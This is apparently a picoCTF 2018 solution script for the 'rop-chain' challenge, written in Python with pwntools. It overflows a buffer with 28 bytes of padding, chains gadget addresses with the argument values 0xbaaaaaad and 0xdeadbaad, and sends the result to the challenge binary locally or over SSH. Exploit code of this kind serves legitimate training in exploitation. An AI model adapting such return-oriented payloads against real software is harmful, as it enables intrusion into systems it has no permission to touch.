#!/usr/bin/python
import struct
from pwn import *
debug = 1
user ='XXXX'
pw = 'XXXX'
if not debug:
    s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
    s.set_working_directory('/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d')
b32 = lambda x: struct.pack("I", x)


exploit = "A"*28
exploit += b32(0x080485cb)
exploit += b32(0x080485d8)
exploit += b32(0x0804862b)
exploit += b32(0xbaaaaaad)
exploit += b32(0xdeadbaad)

if not debug:
    r = s.process('./rop')
else:
    r = process('./rop')

r.recvuntil('> ')
r.sendline(exploit)
print r.recvall()
r.close()
